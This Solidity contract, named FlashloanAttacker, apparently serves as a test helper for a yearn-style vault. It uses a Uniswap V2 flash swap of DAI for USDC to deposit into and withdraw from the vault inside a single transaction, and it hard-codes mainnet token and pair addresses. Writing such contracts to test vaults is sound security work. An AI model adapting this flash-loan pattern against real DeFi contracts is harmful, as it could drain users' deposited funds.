pragma solidity 0.6.12;

import "../interfaces/yearn/IVault.sol";
import {IERC20, Address, SafeERC20} from "@openzeppelin/contracts/token/ERC20/SafeERC20.sol";
import "../../interfaces/UniswapInterfaces/IUniswapV2Router02.sol";
import "../../interfaces/UniswapInterfaces/IUniswapV2Pair.sol";

contract FlashloanAttacker {
    using SafeERC20 for IERC20;

    IVault public vault;

    IERC20 public constant dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 public constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IUniswapV2Router02 router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Pair pair = IUniswapV2Pair(0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5);

    constructor(IVault _vault) public {
        vault = _vault;
    }

    function depositAll() public {
        // Deposit all the DAI
        uint256 amount = dai.balanceOf(address(this));
        dai.safeApprove(address(vault), amount);
        vault.deposit(dai.balanceOf(address(this)));
    }

    function performAttack() public {
        uint256 daiIn = dai.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = address(dai);
        path[1] = address(usdc);

        uint256[] memory amounts = router.getAmountsOut(daiIn, path);
        uint256 usdcOut = amounts[1];

        bytes memory data = abi.encode(daiIn);

        // Call swap to receive USDC from Pair
        address token0 = pair.token0();
        if (token0 == address(dai)) {
            pair.swap(0, usdcOut, address(this), data);
        } else {
            pair.swap(usdcOut, 0, address(this), data);
        }
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) 
        public 
    {
        assert(msg.sender == address(pair)); // ensure that msg.sender is a V2 pair

        // Withdraw all from vault
        vault.withdraw();

        // At the end of uniswapV2Call, contracts must return enough tokens to the pair to make it whole.
        // Specifically, this means that the product of the pair reserves after the swap, discounting all token amounts
        // sent by 0.3% LP fee, must be greater than before.

        // In the case where the token withdrawn is not the token returned (i.e. DAI was requested in the flash swap, and WETH
        // was returned, or vice versa), the fee simplifies to the simple swap case. This means that the standard getAmountIn
        // pricing function should be used to calculate e.g., the amount of WETH that must be returned in exchange for the amount
        // of DAI that was requested out.

        uint256 daiIn = abi.decode(data, (uint256));
        dai.transfer(msg.sender, daiIn);
    }
}
